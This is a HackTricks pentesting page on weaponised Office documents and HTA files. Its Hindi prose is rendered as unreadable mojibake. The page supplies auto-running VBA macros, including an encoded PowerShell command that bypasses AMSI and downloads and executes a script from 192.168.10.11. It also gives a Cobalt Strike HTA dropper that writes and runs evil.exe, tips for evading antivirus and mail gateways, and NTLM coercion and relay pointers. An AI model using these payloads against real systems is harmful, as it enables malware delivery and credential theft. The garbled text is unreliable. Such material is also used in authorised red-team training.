# рдлрд┐рд╢рд┐рдВрдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЙрдкрд▓рдмреНрдзрддрд╛** рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

## рдСрдлрд┐рд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝

рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╡рд░реНрдб рдлрд╝рд╛рдЗрд▓ рдЦреЛрд▓рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдлрд╝рд╛рдЗрд▓ рдбреЗрдЯрд╛ рдорд╛рдиреНрдпрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИред рдбреЗрдЯрд╛ рдорд╛рдиреНрдпрддрд╛ рдХреЛ рдСрдлрд┐рд╕рдУрдкрдирдПрдордПрд▓ рд╕реНрдЯреИрдВрдбрд░реНрдб рдХреЗ рдЦрд┐рд▓рд╛рдл рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛ рдкрд╣рдЪрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛ рдкрд╣рдЪрд╛рди рдХреЗ рджреМрд░рд╛рди рдХреЛрдИ рддреНрд░реБрдЯрд┐ рд╣реЛрддреА рд╣реИ рддреЛ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХреА рдЬрд╛ рд░рд╣реА рдлрд╝рд╛рдЗрд▓ рдирд╣реАрдВ рдЦреЛрд▓реА рдЬрд╛рдПрдЧреАред

рдЖрдорддреМрд░ рдкрд░, рдореИрдХреНрд░реЛрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╡рд░реНрдб рдлрд╝рд╛рдЗрд▓реЗрдВ `.docm` рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдмрджрд▓рдХрд░ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рднреА рдЙрдирдХреА рдореИрдХреНрд░реЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреНрд╖рдорддрд╛рдПрдВ рдмрд░рдХрд░рд╛рд░ рд░рдЦреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ RTF рдлрд╝рд╛рдЗрд▓ рдореИрдХреНрд░реЛ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддреА рд╣реИ, рдбрд┐рдЬрд╝рд╛рдЗрди рдХреЗ рдЕрдиреБрд╕рд╛рд░, рд▓реЗрдХрд┐рди RTF рдХреЗ рд░реВрдк рдореЗрдВ рдирд╛рдорд┐рдд рдПрдХ DOCM рдлрд╝рд╛рдЗрд▓ рдХреЛ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╡рд░реНрдб рджреНрд╡рд╛рд░рд╛ рд╕рдВрднрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдореИрдХреНрд░реЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред\
рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдСрдлрд┐рд╕ рд╕реНрдпреВрдЯ (рдПрдХреНрд╕реЗрд▓, рдкрд╛рд╡рд░рдкреЙрдЗрдВрдЯ рдЖрджрд┐) рдХреЗ рд╕рднреА рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдкрд░ рдПрдХ рд╣реА рдЖрдВрддрд░рд┐рдХ рдФрд░ рдпрд╛рдВрддреНрд░рд┐рдХ рддрдВрддреНрд░ рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ рдХреМрди рд╕реЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд┐рд╕реА рдСрдлрд┐рд╕ рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX рдлрд╝рд╛рдЗрд▓реЗрдВ рдПрдХ рджреВрд░рд╕реНрде рдЯреЗрдореНрдкрд▓реЗрдЯ (рдлрд╝рд╛рдЗрд▓ - рд╡рд┐рдХрд▓реНрдк - рдПрдб-рдЗрди - рдкреНрд░рдмрдВрдзрд┐рдд: рдЯреЗрдореНрдкрд▓реЗрдЯ - рдЬрд╛рдПрдВ) рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрддреА рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдореИрдХреНрд░реЛрдЬрд╝ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ "рдЪрд▓рд╛" рд╕рдХрддреЗ рд╣реИрдВред

### рдмрд╛рд╣рд░реА рдЫрд╡рд┐ рд▓реЛрдб

рдЬрд╛рдПрдВ: _рдЗрдВрдЬреЗрдХреНрдЯ --> рддрддреНрд╡ рддрддреНрд╡ --> рдХреНрд╖реЗрддреНрд░_\
_**рд╢реНрд░реЗрдгрд┐рдпрд╛рдБ**: рд▓рд┐рдВрдХ рдФрд░ рд╕рдВрджрд░реНрдн, **рдлрд╝рд╛рдЗрд▓реНрдб рдирд╛рдо**: includePicture, рдФрд░ **рдлрд╝рд╛рдЗрд▓рдирд╛рдо рдпрд╛ URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (316).png>)

### рдореИрдХреНрд░реЛрдЬрд╝ рдмреИрдХрдбреЛрд░

рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ рд╡рд┐рдЪрд┐рддреНрд░ рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдореИрдХреНрд░реЛрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### рдСрдЯреЛрд▓реЛрдб рдлрд╝рдВрдХреНрд╢рди

рдЬрд┐рддрдиреЗ рдЕрдзрд┐рдХ рд╕рд╛рдорд╛рдиреНрдп рд╣реЛрдВрдЧреЗ, рдЙрддрдиреЗ рд╣реА рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ AV рдЙрдиреНрд╣реЗрдВ рдкрд╣рдЪрд╛рдиреЗрдВрдЧреЗред

* AutoOpen()
* Document\_Open()

#### рдореИрдХреНрд░реЛрдЬрд╝ рдХреЛрдб рдЙрджрд╛рд╣рд░рдг
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### рдореИрдЯрд╛рдбреЗрдЯрд╛ рдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рд╣рдЯрд╛рдПрдВ

**рдлрд╝рд╛рдЗрд▓ > рдЬрд╛рдирдХрд╛рд░реА > рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ > рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** рдкрд░ рдЬрд╛рдПрдВ, рдЬрд┐рд╕рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рдЬрд╛рдВрдЪрдХрд░реНрддрд╛ рдЦреБрд▓реЗрдЧрд╛ред **рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдЧреБрдг рдФрд░ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЬрд╛рдирдХрд╛рд░реА** рдХреЗ рдкрд╛рд╕ **рд╕рднреА рд╣рдЯрд╛рдПрдВ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

#### рдбреЙрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди

рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░, **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ** рдбреНрд░реЙрдкрдбрд╛рдЙрди, **`.docx`** рд╕реЗ **Word 97-2003 `.doc`** рдореЗрдВ рдкреНрд░рд╛рд░реВрдк рдмрджрд▓реЗрдВред\
рдЗрд╕реЗ рдЗрд╕рд▓рд┐рдП рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк **`.docx`** рдореЗрдВ рдореИрдХреНрд░реЛ рд╕рд╣реЗрдЬ рдирд╣реАрдВ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдореИрдХреНрд░реЛ-рд╕рдХреНрд╖рдо **`.docm`** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдЖрд╕-рдкрд╛рд╕ рдПрдХ **рд╕рдВрдХреЗрдд** рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдердВрдмрдиреЗрд▓ рдЖрдЗрдХрди рдореЗрдВ рдПрдХ рд╡рд┐рд╢рд╛рд▓ `!` рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреБрдЫ рд╡реЗрдм/рдИрдореЗрд▓ рдЧреЗрдЯрд╡реЗ рдЙрдиреНрд╣реЗрдВ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрд╡рд░реБрджреНрдз рдХрд░ рджреЗрддреЗ рд╣реИрдВ)ред рдЗрд╕рд▓рд┐рдП, рдпрд╣ **рдкреБрд░рд╛рдиреА `.doc` рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╕рдордЭреМрддрд╛ рд╣реИ**ред

#### рдХреНрд╖рддрд┐рдкреВрд░реНрдг рдореИрдХреНрд░реЛ рдЬреЗрдирд░реЗрдЯрд░

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA рдлрд╝рд╛рдЗрд▓реЗрдВ

рдПрдХ HTA рдПрдХ рдкреНрд░реЛрдкреНрд░рд╛рдЗрдЯрд░реА Windows рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╣реИ рдЬрд┐рд╕рдХрд╛ **рд╕реНрд░реЛрдд рдХреЛрдб HTML рдФрд░ рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ** рд╕реЗ рдорд┐рд▓рдХрд░ рдмрдирд╛ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ Internet Explorer (VBScript рдФрд░ JScript) рд╕рдорд░реНрдерд┐рдд рдХрд░рддрд╛ рд╣реИред HTML рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдФрд░ рдХрд╛рд░реНрдпрдХреНрд░рдо рддрд╛рд░реНрдХрд┐рдХ рдХреЗ рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ HTA рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдореЙрдбрд▓ рдХреА рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдмрд┐рдирд╛ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ "рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп" рдПрдХреНрд╕реЗрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддрд╛ рд╣реИред

HTA рдХреЛ **`mshta.exe`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд╕рд╛рдорд╛рдиреНрдпрддрдГ **Internet Explorer** рдХреЗ рд╕рд╛рде **рд╕реНрдерд╛рдкрд┐рдд** рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рдХрд╛рд░рдг **`mshta` IE рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдпрд╣ рдЕрдирдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ HTA рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛ рд╕рдХреЗрдВрдЧреЗред
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдмрд▓рд╡рд╛рди рдмрдирд╛рдирд╛

**рджреВрд░рд╕реНрде** NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдмрд▓рд╡рд╛рди рдмрдирд╛рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдИрдореЗрд▓ рдпрд╛ HTML рдореЗрдВ **рдЕрджреГрд╢реНрдп рдЫрд╡рд┐рдпреЛрдВ** рдХреЛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдЧрд╛ (рдХреНрдпрд╛ HTTP MitM рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА?). рдпрд╛ рдкреАрдбреАрдПрдл рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдкрддреЗ рднреЗрдЬрдХрд░ рдкреАрдбреАрдПрдл рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд░рдиреЗ рд╡рд╛рд▓реА **рдлрд╝реЛрд▓реНрдбрд░** рдХреА **рдкрддрд╛** рджреЗрдВ рд╕рдХрддреЗ рд╣реИрдВред

**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрдареЛрдВ рдореЗрдВ рдЗрди рд╡рд┐рдЪрд╛рд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рдЕрдзрд┐рдХ:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM рд░рд┐рд▓реЗ

рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдЖрдк рди рдХреЗрд╡рд▓ рд╣реИрд╢ рдпрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреЛрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ** рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* [**NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM рд░рд┐рд▓реЗ рд╕реЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
